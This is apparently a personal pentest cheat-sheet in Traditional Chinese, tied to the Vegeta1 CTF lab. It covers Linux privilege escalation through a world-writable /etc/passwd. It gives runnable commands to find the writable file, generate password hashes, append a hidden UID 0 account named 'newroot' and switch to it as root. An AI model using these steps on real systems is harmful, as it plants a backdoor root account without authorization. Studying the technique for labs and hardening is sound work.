# 可寫系統密碼檔提權 (writable-etc-passwd)
本文件說明如何利用 Linux 系統中配置錯誤、對普通使用者可寫的 `/etc/passwd` 檔案進行本地特權提升（Privilege Escalation）。

## 🔍 檢測可寫密碼檔
使用以下指令檢查 `/etc/passwd` 是否對當前使用者可寫：
```bash
ls -la /etc/passwd

# 或者使用 find 指令列出系統中所有可寫檔案
find /etc -writable -type f 2>/dev/null
```
若檔案權限顯示為 `-rw-rw-rw-`（即權限為 `666`）或對 other 有寫入權限，即可進行編輯。

## 🛠️ 利用與提權步驟

### 1. 生成加密的密碼 Hash 碼
我們需要手動伪造一筆使用者記錄，其密碼需要以 Hash 格式寫入。我們可以在本地或攻擊機使用 `openssl` 或 `python` 生成：
*   **方法 A (openssl)**：
    ```bash
    # 生成密碼為 123456 的 MD5-crypt 雜湊 (使用 myroot 作為 salt)
    openssl passwd -1 -salt myroot 123456
    ```
*   **方法 B (python)**：
    ```bash
    python3 -c 'import crypt; print(crypt.crypt("123456", "$6$mysalt"))'
    ```

### 2. 追加特權使用者至 `/etc/passwd`
向 `/etc/passwd` 尾端寫入一筆具備 root 權限（UID: 0, GID: 0）的自定義使用者（如 `newroot`）：
```bash
echo "newroot:<PASSWORD_HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
```
*   *注意：如果直接在 shell 命令列中使用 echo，Hash 中的 `$` 符號需要使用 `\` 轉義（寫成 `\$`），否則會被解析為環境變數。*

### 3. 切換帳號取得 Root 權限
```bash
su newroot
# 輸入您設定的密碼 (如 123456)
```
成功登入後，執行 `whoami` 確認已順利取得 `root` 權限。

---

# 實戰關聯
*   **靶機應用實例**：[[Vegeta1]]（利用 /etc/passwd 對 all users 可寫的漏洞，追加 `newroot` 使用者完成提權）。
